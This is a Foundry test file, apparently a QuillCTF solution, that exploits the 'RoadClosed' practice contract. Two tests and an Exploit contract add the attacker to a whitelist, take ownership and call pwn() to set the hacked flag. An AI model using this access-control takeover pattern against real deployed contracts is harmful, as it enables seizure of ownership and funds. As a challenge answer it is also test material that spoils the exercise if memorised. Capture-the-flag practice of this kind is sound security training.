// SPDX-License-Identifier: GPL-3.0
pragma solidity 0.8.7;

import "forge-std/Test.sol";
import "../../src/QuillCTF/RoadClosed.sol";

contract RoadClosedTest is Test {
 RoadClosed public roadClosed;
 Exploit public exploit;
 address public deployer;
 address public attacker;
 function setUp() public {
   deployer = vm.addr(1); 
   attacker = vm.addr(2); 
   vm.startPrank(deployer);
   roadClosed = new RoadClosed();
  // exploit = new Exploit();
   vm.stopPrank();
 }

 function testRoadClosedExploit() public {
   vm.startPrank(attacker);
   roadClosed.addToWhitelist(attacker); // first adding ourself to the whitelist to become the owner
   roadClosed.changeOwner(attacker); // change to owner as attacker
   roadClosed.pwn(attacker); // then call the function pwn to set the hacked bool to true
   bool hacked = roadClosed.isHacked(); //verifying hacked bool value is true
   bool owner = roadClosed.isOwner(); // verifying the owner of contract is true
   vm.stopPrank();
   assert(owner == true); // required first objective, become the owner of the contract
   assert(hacked == true); // required second objective, change the value of hacked to true
 }

 function testRoadClosedContractExploit() public {
   
   exploit = new Exploit(address(roadClosed));
   bool hacked = roadClosed.isHacked(); //verifying hacked bool value is true
   vm.startPrank(address(exploit));
   bool owner = roadClosed.isOwner(); // verifying the owner of contract is true
   vm.stopPrank();
   assert(owner == true); // required first objective, become the owner of the contract
   assert(hacked == true); // required second objective, change the value of hacked to true
 }
}

contract Exploit {

   constructor(address _address) {
   RoadClosed(_address).addToWhitelist(address(this)); // first adding ourself to the whitelist to become the owner
   RoadClosed(_address).changeOwner(address(this)); // change to owner as attacker
   RoadClosed(_address).pwn(address(this)); // then call the function pwn to set the hacked bool to true
    }

}
 